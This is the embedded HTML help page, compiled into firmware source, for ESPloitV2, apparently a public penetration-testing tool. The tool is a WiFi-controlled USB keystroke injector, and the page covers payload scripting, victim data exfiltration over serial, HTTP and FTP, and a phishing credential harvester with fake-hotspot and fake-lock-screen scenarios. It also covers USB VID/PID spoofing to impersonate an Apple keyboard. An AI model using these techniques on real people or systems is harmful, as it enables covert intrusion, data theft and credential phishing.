const char HelpText[] PROGMEM = R"=====(
<!DOCTYPE HTML>
<html>
<head>
<title>ESPloit Help</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="stylesheet" href="/style.css">
</head>
<body>

<div class="nav">
<a href="/esploit">&larr; Back</a>
<span class="brand">ESPloit Help</span>
</div>

<!-- Table of Contents -->
<div class="card">
<h2>Table of Contents</h2>
<ol>
<li><a href="#overview">Overview</a></li>
<li><a href="#initial-flashing">Initial Flashing</a></li>
<li><a href="#initial-config">Initial Configuration</a></li>
<li><a href="#reset-defaults">Resetting to Defaults</a></li>
<li><a href="#configure">Configure ESPloit</a></li>
<li><a href="#scripting">Scripting a Payload</a></li>
<li><a href="#uploading">Uploading a Payload</a></li>
<li><a href="#choose">Choose a Payload</a></li>
<li><a href="#live">Live Payload Mode</a></li>
<li><a href="#input">Input Mode</a></li>
<li><a href="#duckuino">Duckuino Mode</a></li>
<li><a href="#exfil-list">List Exfiltrated Data</a></li>
<li><a href="#format">Format File System</a></li>
<li><a href="#upgrade">Upgrade Firmware</a></li>
<li><a href="#exfiltrating">Exfiltrating Data</a></li>
<li><a href="#esportal">ESPortal Credential Harvester</a></li>
<li><a href="#vidpid">Changing VID/PID</a></li>
<li><a href="#locale">Changing Keyboard Locale</a></li>
<li><a href="#license">Licensing Information</a></li>
</ol>
</div>

<!-- Overview -->
<div class="card" id="overview">
<h2>Overview</h2>
<p>ESPloitV2</p>
<p class="muted">Created by Corey Harding<br>
www.LegacySecurityGroup.com / www.Exploit.Agency<br>
<a href="https://github.com/exploitagency/ESPloitV2" target="_blank">https://github.com/exploitagency/ESPloitV2</a></p>
<hr>
<p>ESPloit is a WiFi controlled HID Keyboard Emulator similar to the USB Rubber Ducky by Hak5. This version was created specifically for the Cactus WHID which is a USB stick that utilizes an ESP-12S WiFi module with a serial connection to a 32u4 microcontroller. The device has 4M of flash storage more than capable of storing the firmware and a number of payloads. Unlike the Rubber Ducky this device has WiFi allowing the device to host its own access point or connect to an existing network. This allows users to upload and pick between payloads or even type out "live payloads" without uploading a file, and like the Rubber Ducky, ESPloit allows you to set up a payload to run upon insertion of the device. The device also supports upgrading the firmware over WiFi, deleting payloads, reformatting the file system, WiFi and basic configuration, and more.</p>
<hr>
<p>ESPloit is distributed under the MIT License. The license and copyright notice can not be removed and must be distributed alongside all future copies of the software.</p>
</div>

<!-- Initial Flashing -->
<div class="card" id="initial-flashing">
<h2>Initial Flashing</h2>

<div class="sect">
<h3>Arduino IDE Setup</h3>
<ol>
<li>Download and Install the Arduino IDE from <a href="http://www.Arduino.cc" target="_blank">http://www.Arduino.cc</a></li>
<li>Open Arduino IDE.</li>
<li>Go to <strong>File &gt; Preferences</strong>. Locate the field "Additional Board Manager URLs:"</li>
<li>Add <code>http://arduino.esp8266.com/stable/package_esp8266com_index.json</code> and click "Ok"</li>
<li>Select <strong>Tools &gt; Board &gt; Boards Manager</strong>. Search for "esp8266".</li>
<li>Install <strong>esp8266 by ESP8266 community version 2.3.0</strong>. Click "Close".</li>
<li>Select <strong>Sketch &gt; Include Library &gt; Manage Libraries</strong>. Search for "Json".</li>
<li>Install <strong>ArduinoJson by Benoit Blanchon version 5.11.0</strong> and click "Close".</li>
<li>Download <a href="https://github.com/exploitagency/esp8266FTPServer/archive/feature/bbx10_speedup.zip" target="_blank">esp8266FTPServer bbx10_speedup.zip</a></li>
<li>Click <strong>Sketch &gt; Include Library &gt; Add .ZIP Library</strong> and select bbx10_speedup.zip from your Downloads folder.</li>
</ol>
<div class="info">The Arduino IDE is now configured and ready for the code.</div>
</div>

<div class="sect">
<h3>Getting the Source Code</h3>
<p>Use git to clone the repo:</p>
<pre>git clone https://github.com/exploitagency/ESPloitV2.git</pre>
<p>Or download/extract the repo as a zip file:<br>
<a href="https://github.com/exploitagency/ESPloitV2/archive/master.zip" target="_blank">https://github.com/exploitagency/ESPloitV2/archive/master.zip</a></p>
</div>

<div class="sect">
<h3>Flashing the 32u4 Programmer</h3>
<ol>
<li>Load the <strong>esp8266Programmer</strong> sketch from the flashing folder.</li>
<li>Select <strong>Tools &gt; Board &gt; "LilyPad Arduino USB"</strong>.</li>
<li>Select the Port your device is connected to under <strong>Tools &gt; Port</strong>.</li>
<li>Upload the sketch.</li>
</ol>
</div>

<div class="sect">
<h3>Compiling and Flashing the ESP</h3>
<ol>
<li>Open the <strong>ESP_Code</strong> sketch from the source folder.</li>
<li>Select <strong>Tools &gt; Board &gt; "Generic ESP8266 Module"</strong>.</li>
<li>Select <strong>Tools &gt; Flash Size &gt; "4M (3M SPIFFS)"</strong>.</li>
<li>Select <strong>Sketch &gt; "Export Compiled Binary"</strong>.</li>
</ol>
<p>Now flash the firmware to the ESP-12S chip using one of the following tools:</p>
<p><strong>Linux:</strong> <a href="https://github.com/AprilBrother/esptool" target="_blank">https://github.com/AprilBrother/esptool</a></p>
<pre>python esptool.py --port=/dev/ttyACM0 --baud 115000 write_flash 0x00000 ESP_Code.ino.generic.bin --flash_size 32m</pre>
<p><strong>Windows:</strong> <a href="https://github.com/nodemcu/nodemcu-flasher" target="_blank">https://github.com/nodemcu/nodemcu-flasher</a></p>
<div class="warn">Do not try to connect to the access point or test anything yet, the device won't work until after the next step.</div>
</div>

<div class="sect">
<h3>Flashing the 32u4 Final Firmware</h3>
<ol>
<li>Open the <strong>Arduino_32u4_code</strong> sketch from the source folder.</li>
<li>Select <strong>Tools &gt; Board &gt; "LilyPad Arduino USB"</strong>.</li>
<li>Select the Port your device is connected to under <strong>Tools &gt; Port</strong>.</li>
<li>Upload the sketch.</li>
</ol>
<div class="info">Your ESPloit is now ready to configure and/or use.</div>
</div>
</div>

<!-- Initial Configuration -->
<div class="card" id="initial-config">
<h2>Initial Configuration</h2>
<p>ESPloit by default creates an Access Point with the SSID <code>Exploit</code> with a password of <code>DotAgency</code>.</p>
<p>Connect to this access point and open a web browser pointed to <code>http://192.168.1.1</code></p>
<p>You are now greeted with the main menu of ESPloit. From here there are several options:</p>
<table>
<tr><td><strong>Upload Payload</strong></td><td>Upload a payload.txt file</td></tr>
<tr><td><strong>Choose Payload</strong></td><td>Choose a payload to run</td></tr>
<tr><td><strong>Live Payload Mode</strong></td><td>Type out or copy/paste a payload to run without uploading</td></tr>
<tr><td><strong>Input Mode</strong></td><td>Use the device as a keyboard/mouse substitute</td></tr>
<tr><td><strong>Duckuino Mode</strong></td><td>Convert and optionally run Ducky Script payloads to ESPloit compatible script</td></tr>
<tr><td><strong>Configure ESPloit</strong></td><td>Configure WiFi and basic settings</td></tr>
<tr><td><strong>List Exfiltrated Data</strong></td><td>Lists any exfiltrated data</td></tr>
<tr><td><strong>Format File System</strong></td><td>Format the file system</td></tr>
<tr><td><strong>Upgrade ESPloit Firmware</strong></td><td>Upgrade the ESP-12S ESPloit firmware from a web browser</td></tr>
<tr><td><strong>Help</strong></td><td>Brings up this help file</td></tr>
</table>
<hr>
<p>The default administration username is <code>admin</code> and password <code>hacktheplanet</code>. This username and password is used to Configure ESPloit or to Upgrade the Firmware.</p>
</div>

<!-- Resetting to Defaults -->
<div class="card" id="reset-defaults">
<h2>Resetting to Default Configuration / Recovering Device</h2>
<ol>
<li>Plug the device into your computer.</li>
<li>Open the Arduino IDE.</li>
<li>Select <strong>Tools &gt; Board &gt; "LilyPad Arduino USB"</strong>.</li>
<li>Select <strong>Tools &gt; Port</strong> and the port the device is connected to.</li>
<li>Select <strong>Tools &gt; "Serial Monitor"</strong>.</li>
<li>Select <strong>38400 baud</strong>.</li>
<li>Type in <code>ResetDefaultConfig:</code> (be sure to include the colon symbol).</li>
<li>Click Send.</li>
</ol>
<p>You should now receive the following reply: "Resetting configuration files back to default settings."</p>
<p>Wait about 15 seconds or until the LED blinks and unplug and replug in the device.</p>
<p>The device has now been reset back to default settings.</p>
<p>Connect to the Access Point with the SSID <code>Exploit</code> with a password of <code>DotAgency</code>.</p>
<p>Open a web browser pointed to <code>http://192.168.1.1</code></p>
<p>The default administration username is <code>admin</code> and password <code>hacktheplanet</code>.</p>
<hr>
<div class="info"><strong>Troubleshooting WiFi connections:</strong> Certain devices seem to have trouble connecting to a password protected ESP8266 access point. The symptoms of this involve repeatedly being prompted to enter the password and being unable to connect to the ESP8266 via WiFi. This can be solved by following the above instructions but instead issuing the command <code>ResetDefaultConfig:OpenNetwork</code> via serial. The device will be restored to the factory defaults (with the exception of now being an unsecured network). The device will reboot and you may now connect to it as an unsecured WiFi access point with an SSID of "Exploit". You should now be able to establish a connection.</div>
</div>

<!-- Configure ESPloit -->
<div class="card" id="configure">
<h2>Configure ESPloit</h2>
<p>Default credentials to access the configuration page:</p>
<p>Username: <code>admin</code><br>Password: <code>hacktheplanet</code></p>

<div class="sect">
<h3>WiFi Configuration</h3>
<p><strong>Network Type</strong></p>
<ul>
<li><strong>Access Point Mode:</strong> Create a standalone access point (No Internet Connectivity - Requires Close Proximity)</li>
<li><strong>Join Existing Network:</strong> Join an existing network (Possible Internet Connectivity - Could use Device Remotely)</li>
</ul>
<p><strong>Hidden:</strong> Choose whether or not to use a hidden SSID when creating an access point</p>
<p><strong>SSID:</strong> SSID of the access point to create or of the network you are choosing to join</p>
<p><strong>Password:</strong> Password of the access point which you wish to create or of the network you are choosing to join</p>
<p><strong>Channel:</strong> Channel of the access point you are creating</p>
<hr>
<p><strong>IP:</strong> IP to set for ESPloit</p>
<p><strong>Gateway:</strong> Gateway to use, make it the same as ESPloit's IP if an access point or the same as the router if joining a network</p>
<p><strong>Subnet:</strong> Typically set to 255.255.255.0</p>
</div>

<div class="sect">
<h3>ESPloit Administration Settings</h3>
<p><strong>Username:</strong> Username to configure/upgrade ESPloit</p>
<p><strong>Password:</strong> Password to configure/upgrade ESPloit</p>
</div>

<div class="sect">
<h3>Payload Settings</h3>
<p><strong>Delay Between Sending Lines of Code in Payload:</strong> Delay in milliseconds between sending lines from payload or when manually inserting a "DELAY" in the payload (Default: 2000)</p>
<p><strong>Automatically Deploy Payload Upon Insertion:</strong> Choose Yes or No to automatically deploy a payload when inserting the device</p>
<p><strong>Automatic Payload:</strong> Choose the location of the payload to run upon insertion</p>
</div>
</div>

<!-- Scripting a Payload -->
<div class="card" id="scripting">
<h2>Scripting a Payload</h2>
<p>ESPloit uses its own scripting language and not Ducky Script, although a Ducky Script to ESPloit converter is available in the Duckuino Mode page.</p>
<p>Examples of ESPloit's scripting language can be seen below.</p>
<div class="warn"><strong>COMMANDS ARE CASE SENSITIVE!</strong> Do not insert any spaces after a command unless intentional and as part of a string, etc. Do not place any blank lines in a payload!</div>

<div class="sect">
<h3>Command Reference</h3>

<h3>Rem: <small>Comment</small></h3>
<p>Set comments in your payload.</p>
<pre>Rem: This is a comment</pre>

<hr>

<h3>DefaultDelay:X <small>Override Default Delay</small></h3>
<p>Overrides the default delay set in the ESPloit configuration portal but only for this specific payload. Delay is in milliseconds and defined as the wait between sending lines in the payload.</p>
<pre>DefaultDelay:10000</pre>
<p class="muted">Waits 10 seconds between sending each line in the payload.</p>

<hr>

<h3>CustomDelay:X <small>One-Time Delay</small></h3>
<p>Set a one time delay between sending lines in payload. The default delay will still apply for all other lines except this one.</p>
<pre>CustomDelay:5000</pre>
<p class="muted">Ignores the default delay for this line and waits 5 seconds before sending the next line in the payload.</p>

<hr>

<h3>Delay <small>Generic Delay</small></h3>
<p>Waits for The Default Delay x 2 before proceeding to next item in payload.</p>
<pre>Delay</pre>

<hr>

<h3>Press:X <small>Key Press</small></h3>
<p>For individual keypresses or combinations of key presses. Expects Decimal Key Code Values for X, Y, Z, etc.</p>
<pre>Press:X
Press:X+Y
Press:X+Y+Z</pre>
<p>Example: Sending <code>Press:131+114</code> with the device's USB plugged into a Windows machine would output KEY_LEFT_GUI (Windows Key) + r thus launching the RUN prompt.</p>
<p>Key code references:</p>
<ul>
<li>Modifier keys (GUI, ALT, CTRL, etc): <a href="https://www.arduino.cc/en/Reference/KeyboardModifiers" target="_blank">https://www.arduino.cc/en/Reference/KeyboardModifiers</a></li>
<li>ASCII table lookup: <a href="http://www.asciitable.com/" target="_blank">http://www.asciitable.com/</a></li>
</ul>

<hr>

<h3>Print:XYZ <small>Type Text</small></h3>
<p>Types out strings of text.</p>
<pre>Print:www.Exploit.Agency</pre>
<p class="muted">Types out "www.Exploit.Agency" on the machine connected via USB.</p>

<hr>

<h3>PrintLine:XYZ <small>Type Text + Enter</small></h3>
<p>Types out strings of text and then presses ENTER.</p>
<pre>PrintLine:www.Exploit.Agency</pre>
<p class="muted">Types out "www.Exploit.Agency" on the machine connected via USB and then presses and releases the ENTER key.</p>

<hr>

<h3>MouseMove <small>Move Mouse</small></h3>
<p>Moves the mouse cursor. Valid range of values for X is 1-127. X must be a number.</p>
<pre>MouseMoveUp:X
MouseMoveDown:X
MouseMoveLeft:X
MouseMoveRight:X</pre>

<hr>

<h3>MouseClick <small>Mouse Click</small></h3>
<p>Clicks the LEFT, RIGHT, or MIDDLE mouse button. Case Sensitive.</p>
<pre>MouseClickLEFT:
MouseClickRIGHT:
MouseClickMIDDLE:</pre>

<hr>

<h3>BlinkLED:X <small>Blink LED</small></h3>
<p>Blinks the LED X number of times (750ms ON, 500ms OFF).</p>
<pre>BlinkLED:3</pre>
<p class="muted">Blinks the LED 3 times. Useful for knowing what stage of a payload you are on (add to the end of payload).</p>
</div>

<hr>

<div class="sect">
<h3>Special Characters / Known Issues</h3>
<p>Currently the only character that has been found not to work is the "less than" symbol, <code>&lt;</code>.</p>
<div class="warn">This bug does <strong>NOT</strong> apply to Live Payload Mode. This only applies if you are using Upload Payload -- the script will stop uploading when it reaches the <code>&lt;</code> symbol.</div>
<p>The workaround for writing a script that requires a <code>&lt;</code> is to replace all instances of <code>&lt;</code> with <code>&amp;lt;</code>.</p>
<p>The script will upload properly and when viewed and/or ran it will replace <code>&amp;lt;</code> with <code>&lt;</code>.</p>
</div>
</div>

<!-- Uploading a Payload -->
<div class="card" id="uploading">
<h2>Uploading a Payload</h2>
<p>Click browse and choose a payload to upload.</p>
<p>Names should not contain any special characters and should stick to letters and numbers only.</p>
<div class="warn">Names must be shorter than <strong>21 characters</strong>. The SPIFFS file system used has a 31 character limit, 10 characters are used for the folder structure "/payloads/".</div>
<div class="info">You may save several characters by naming payloads without using an extension.</div>
</div>

<!-- Choose a Payload -->
<div class="card" id="choose">
<h2>Choose a Payload</h2>
<p>This is a list of all payloads that have been uploaded.</p>
<p>You may click the payload name to see the contents of a payload.</p>
<p>Click "Run Payload" to run the payload or click "Delete Payload" to delete the payload.</p>
<p>The file size and filesystem information is also listed on this page.</p>
</div>

<!-- Live Payload Mode -->
<div class="card" id="live">
<h2>Live Payload Mode</h2>
<p>Here you may type out or copy/paste a payload to run without uploading.</p>
</div>

<!-- Input Mode -->
<div class="card" id="input">
<h2>Input Mode</h2>
<p>Use the device as a keyboard/mouse substitute.</p>
</div>

<!-- Duckuino Mode -->
<div class="card" id="duckuino">
<h2>Duckuino Mode</h2>
<p>Convert Ducky Script to ESPloit Script and then optionally run the script.</p>
<p>Paste Ducky Script on the text area to the left. Click convert and the ESPloit compatible script appears on the right.</p>
</div>

<!-- List Exfiltrated Data -->
<div class="card" id="exfil-list">
<h2>List Exfiltrated Data</h2>
<p>Displays any data that has been collected from the victim using ESPloit's exfiltration methods.</p>
</div>

<!-- Format File System -->
<div class="card" id="format">
<h2>Format File System</h2>
<div class="warn">This will erase the contents of the SPIFFS file system including <strong>ALL</strong> Payloads that have been uploaded. Formatting may take up to 90 seconds.</div>
<p>All current settings will be retained unless you reboot your device during this process.</p>
</div>

<!-- Upgrade Firmware -->
<div class="card" id="upgrade">
<h2>Upgrade ESPloit Firmware</h2>
<p>Authenticate using your username and password set in the configuration page.</p>
<p>Default credentials to access the firmware upgrade page:</p>
<p>Username: <code>admin</code><br>Password: <code>hacktheplanet</code></p>
<p>Select "Browse", choose the new firmware to be uploaded to the ESP-12S chip and then click "Upgrade".</p>
<p>You will need to manually reset the device upon the browser alerting you that the upgrade was successful.</p>
<div class="warn">If you are using this mode to swap the firmware loaded on the ESP-12S chip, and if the new firmware does not support this mode then you must reflash the ESP-12S manually by uploading the programmer sketch to the 32u4 chip and then flash the ESP-12S this way.</div>
</div>

<!-- Exfiltrating Data -->
<div class="card" id="exfiltrating">
<h2>Exfiltrating Data</h2>

<div class="sect">
<h3>Serial Exfiltration Method</h3>
<ol>
<li>Find the victim's COM port</li>
<li>Set the baud rate to <strong>38400</strong> on victim machine</li>
<li>Send the text <code>SerialEXFIL:</code> followed by the data to exfiltrate</li>
</ol>
<p>Exfiltrated data will be saved to the file <code>SerialEXFIL.txt</code></p>
<p class="muted">See the example payloads for more info.</p>
</div>

<div class="sect">
<h3>WiFi Exfiltration Methods</h3>
<p>To exfiltrate data using WiFi methods be sure ESPloit and Target machine are on the same network. Either set ESPloit to join the Target's network or set the Target to join ESPloit's AP.</p>
<p>Example commands to force victim to connect to ESPloit's network (when set as AP):</p>
<pre>Windows: netsh wlan set hostednetwork mode=allow ssid="SSID-HERE" key="WIFI-PASSWORD-HERE"
Linux:   nmcli dev wifi connect SSID-HERE password WIFI-PASSWORD-HERE</pre>
</div>

<div class="sect">
<h3>HTTP Exfiltration Method</h3>
<p>Point the target machine to the URL listed below:</p>
<pre>http://ESPloit-IP-Here/exfiltrate?file=FILENAME.TXT&amp;data=EXFILTRATED-DATA-HERE</pre>
<p>The victim is forced to access the URL above and now under "List Exfiltrated Data" you will see the file "FILENAME.TXT" containing the exfiltrated data "EXFILTRATED-DATA-HERE".</p>
</div>

<div class="sect">
<h3>FTP Exfiltration Method</h3>
<p>Use the credentials configured in the "Configure ESPloit" page. Also note that only <strong>Passive Mode FTP</strong> is supported.</p>
<p class="muted">See the example payloads for more in depth examples.</p>
</div>
</div>

<!-- ESPortal Credential Harvester -->
<div class="card" id="esportal">
<h2>ESPortal Credential Harvester (Phisher)</h2>
<div class="warn"><strong>NOTE:</strong> Modifying any ESPortal related setting requires a reboot of the ESPloit device. When enabled ESPloit main menu will appear on <code>http://IP-HERE/esploit</code>. Do not leave any line blank or as a duplicate of another.</div>
<p>A social engineering attack vector. Redirects HTTP requests to a fake login page. Does not support HTTPS requests nor does it override cached HTTPS redirects.</p>
<p>You can define a custom template for up to 3 specific domains, a welcome portal, and a catch-all. Captured credentials are stored on the exfiltration page in the file <code>esportal-log.txt</code>.</p>

<div class="sect">
<h3>Example Scenario 1: Fake WiFi Hotspot</h3>
<p>Target capturing login credentials from a specific domain name when victim connects to a fake free WiFi hotspot. Setup ESPloitV2 to act as a free WiFi hotspot (AP Mode, SSID: "Free WiFi", Open Network=Leave Password Blank). Set ESPortal to Enabled, Site 1 Domain (fakesite1.com). User now connects to the open network "Free WiFi", browses to fakesite1.com, they see a login prompt, user attempts to login, ESPortal gives an error, user gets frustrated and gives up. Meanwhile the credentials the user entered are logged and displayed on the Exfiltrated Data page in the file "esportal-log.txt". To make the attack even more effective I have included the ability for the attacker to make their own html templates for the login pages. If the user were to browse to another page not specified as a domain in the settings they will be greeted with a generic login prompt set from the spoof_other.html template.</p>
</div>

<div class="sect">
<h3>Example Scenario 2: Joined Network</h3>
<p>Thinking slightly outside of the box... ESPloit is connected to the victim's network (and is not in AP mode), in this example ESPloit's IP is 192.168.1.169, FTP mode is enabled. Under ESPortal settings set the Welcome Domain to the ESPloit's IP address (192.168.1.169) and set Welcome Page On (/login). Now upload a custom login template to ESPloit named welcome.html (do not use the included welcome.html template as that is simply a greeting and we want a login page so use and rename the included template spoof_other.html to welcome.html and upload it via FTP).</p>
<p>Linux example for uploading the custom template via FTP:</p>
<pre>curl -T spoof_other.html ftp://ftp-admin:hacktheplanet@192.168.1.169/welcome.html</pre>
<p>Now when you browse to 192.168.1.169 you are redirected to a login prompt at 192.168.1.169/login. You can now create a payload to open this webpage on the victim's PC and customize the template to whatever you want. Even though there are easier ways you could use it to capture user login credentials from the victim PC, so you could fullscreen the browser window and make the custom html template look like the PC's lock screen. Or you could make it look like a login page for a website for which you wish to phish credentials. It could also be used to hide ESPloit's admin panel, perhaps when a user browses to ESPloit's IP they go to a "corporate server login page" which user is not authorized to access, remember in ESPortal mode ESPloit's admin panel shows up on http://esploitIP/esploit vs being able to access it from the default http://esploitIP when ESPortal mode is disabled. Remember social engineering is all about being creative.</p>
</div>

<div class="sect">
<h3>Custom HTML Templates</h3>
<p>Custom html templates can be uploaded for the ESPortal login credential harvester via FTP (PASV Mode only). If a custom html template is found it will override the default settings. Upon deletion the default settings are automatically restored.</p>
<div class="info">The filenames must match the below exactly in order to apply a template override.</div>
<table>
<tr><th>Filename</th><th>Purpose</th></tr>
<tr><td><code>captiveportal.html</code></td><td>The catch all that handles the redirects (would be rare to override this part)</td></tr>
<tr><td><code>welcome.html</code></td><td>The welcome page for the "free wifi" hotspot</td></tr>
<tr><td><code>spoof_other.html</code></td><td>The generic login credential harvester for a site not in the list</td></tr>
<tr><td><code>spoof_site1.html</code></td><td>The 1st login credential harvester site in the list with a custom layout</td></tr>
<tr><td><code>spoof_site2.html</code></td><td>The 2nd login credential harvester site in the list with a custom layout</td></tr>
<tr><td><code>spoof_site3.html</code></td><td>The 3rd login credential harvester site in the list with a custom layout</td></tr>
<tr><td><code>error.html</code></td><td>Display some sort of custom error when the user enters login credentials</td></tr>
</table>
</div>
</div>

<!-- Changing VID/PID -->
<div class="card" id="vidpid">
<h2>Changing the VID/PID</h2>
<div class="warn"><strong>WARNING!</strong> This information is being provided for educational purposes only, it is illegal to use a VID/PID that you do not own.</div>
<p>Find and edit <code>boards.txt</code>, it may be located somewhere similar to:</p>
<pre>Linux:   /root/.arduino15/packages/arduino/hardware/avr/1.6.19/
Windows: C:\Users\USER\AppData\Local\Arduino15\packages\arduino\hardware\avr\1.6.19\</pre>
<p>Add the below to the end of the <code>boards.txt</code> file. <strong>RESTART THE ARDUINO IDE!</strong></p>
<p>Now select <strong>Cactus WHID</strong> under <strong>Tools &gt; Boards</strong> instead of LilyPad Arduino USB when you upload the Arduino_32u4_Code sketch.</p>
<pre>##############################################################

CactusWHID.name=Cactus WHID
CactusWHID.vid.0=0x1B4F
CactusWHID.pid.0=0x9207
CactusWHID.vid.1=0x1B4F
CactusWHID.pid.1=0x9208

CactusWHID.upload.tool=avrdude
CactusWHID.upload.protocol=avr109
CactusWHID.upload.maximum_size=28672
CactusWHID.upload.maximum_data_size=2560
CactusWHID.upload.speed=57600
CactusWHID.upload.disable_flushing=true
CactusWHID.upload.use_1200bps_touch=true
CactusWHID.upload.wait_for_upload_port=true

CactusWHID.bootloader.tool=avrdude
CactusWHID.bootloader.low_fuses=0xff
CactusWHID.bootloader.high_fuses=0xd8
CactusWHID.bootloader.extended_fuses=0xce
CactusWHID.bootloader.file=caterina-LilyPadUSB/Caterina-LilyPadUSB.hex
CactusWHID.bootloader.unlock_bits=0x3F
CactusWHID.bootloader.lock_bits=0x2F

CactusWHID.build.mcu=atmega32u4
CactusWHID.build.f_cpu=8000000L
CactusWHID.build.vid=0x0000
CactusWHID.build.pid=0xFFFF
CactusWHID.build.usb_product="Cactus WHID"
CactusWHID.build.usb_manufacturer="April Brother"
CactusWHID.build.board=AVR_LILYPAD_USB
CactusWHID.build.core=arduino
CactusWHID.build.variant=leonardo
CactusWHID.build.extra_flags={build.usb_flags}</pre>
<hr>
<p>Replace this portion with your spoofed VID/PID. <code>0x0000</code> and <code>0xFFFF</code> are only placeholders and should not be used. Replace these with your own personal VID/PID combination:</p>
<pre>CactusWHID.build.vid=0x0000
CactusWHID.build.pid=0xFFFF
CactusWHID.build.usb_product="Cactus WHID"
CactusWHID.build.usb_manufacturer="April Brother"</pre>
<hr>
<div class="warn">On Apple Devices you can theoretically bypass the unknown keyboard hurdle by spoofing an Apple VID/PID. This will run the payload upon insertion vs having to identify the keyboard first. <strong>DO NOT DO THIS!</strong> It is illegal to use a VID/PID that you do not own.</div>
<pre>CactusWHID.build.vid=0x05ac
CactusWHID.build.pid=0x021e
CactusWHID.build.usb_product="Aluminum Keyboard IT USB"
CactusWHID.build.usb_manufacturer="Apple Inc."</pre>
</div>

<!-- Changing Keyboard Locale -->
<div class="card" id="locale">
<h2>Changing the Keyboard Locale</h2>
<p>This is an easy to use solution from BlueArduino20 that is based off the work from NURRL at <a href="https://github.com/Nurrl/LocaleKeyboard.js" target="_blank">https://github.com/Nurrl/LocaleKeyboard.js</a></p>
<ul>
<li><strong>Linux:</strong> <a href="https://github.com/BlueArduino20/LocaleKeyboard.SH" target="_blank">https://github.com/BlueArduino20/LocaleKeyboard.SH</a></li>
<li><strong>Windows:</strong> <a href="https://github.com/BlueArduino20/LocaleKeyboard.BAT" target="_blank">https://github.com/BlueArduino20/LocaleKeyboard.BAT</a></li>
</ul>
</div>

<!-- Licensing Information -->
<div class="card" id="license">
<h2>Licensing Information</h2>
<p>Cactus WHID manufactured by April Brother: <a href="https://aprbrother.com" target="_blank">https://aprbrother.com</a><br>
Cactus WHID hardware design by Luca Bongiorni: <a href="http://whid.ninja" target="_blank">http://whid.ninja</a></p>
<p>ESPloitV2 by Corey Harding: <a href="https://www.LegacySecurityGroup.com" target="_blank">https://www.LegacySecurityGroup.com</a><br>
Code available at: <a href="https://github.com/exploitagency/ESPloitV2" target="_blank">https://github.com/exploitagency/ESPloitV2</a><br>
ESPloitV2 software is licensed under the MIT License</p>
<pre>MIT License

Copyright (c) [2017] [Corey Harding]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.</pre>
<hr>
<p><a href="/license">Click here for additional licensing information</a></p>
</div>

</body>
</html>
)=====";
